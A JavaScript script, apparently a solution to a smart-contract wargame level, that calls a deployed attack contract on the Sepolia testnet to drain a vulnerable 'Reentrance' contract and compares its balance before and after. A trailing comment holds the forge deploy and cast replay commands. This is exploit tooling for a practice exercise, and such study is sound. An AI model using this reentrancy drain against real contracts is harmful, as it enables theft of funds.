
import { createWalletClient, createPublicClient, http, parseEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { sepolia } from 'viem/chains';

const RPC_URL = process.env.sepolia_rpc;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const Reentrance_ADDRESS = process.env.Reentrance_ADDRESS;
const ReentranceATTACK_ADDRESS = process.env.ReentranceATTACK_ADDRESS; // 需要先部署

const abi = [{"type":"constructor","inputs":[{"name":"_reentrance","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"reentrance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"}];

async function main() {
    const client = createPublicClient({
        chain: sepolia,
        transport: http(RPC_URL),
    });

    const account = privateKeyToAccount(PRIVATE_KEY);

    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    console.log('=== Reentrance Attack ===\n');

    // 1. 检查 Reentrance 合约当前余额
    const balanceBefore = await client.getBalance({
        address: Reentrance_ADDRESS
    });

    console.log('Reentrance contract balance before:', balanceBefore.toString(), 'wei');

    // 2. 调用 AttackReentrance 合约的 attack() 函数
    console.log('\nCalling attack() on AttackReentrance contract...');
    
    const tx = await walletClient.writeContract({
        address: ReentranceATTACK_ADDRESS,
        abi: abi,
        functionName: 'attack',
        args: [],
        value: parseEther('0.01'), // 发送 0.01 ETH 作为初始捐款
    });
    console.log('Transaction hash:', tx);

    // 等待交易确认
    const receipt = await client.waitForTransactionReceipt({ hash: tx });
    console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');
    
    // 3. 检查 Reentrance 合约攻击后的余额
    const balanceAfter = await client.getBalance({
        address: Reentrance_ADDRESS
    });
    console.log('Reentrance contract balance after:', balanceAfter.toString(), 'wei');

    
}

main().catch(console.error);
/**
 * /**
    forge create src/11-Reentrance/AttackReentrance.sol:AttackReentrance \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $Reentrance_ADDRESS
# 基本用法 - 重放交易
cast run <交易哈希> --rpc-url $sepolia_rpc

# 显示详细的调用追踪
cast run <交易哈希> --rpc-url $sepolia_rpc --debug

# 显示完整的调用栈和 opcodes
cast run 0x9cbda373d016655a55272cc2aee9424a38d11bbccc0d82b1b55a89cc4538dc2d --rpc-url $sepolia_rpc -vvvv

 */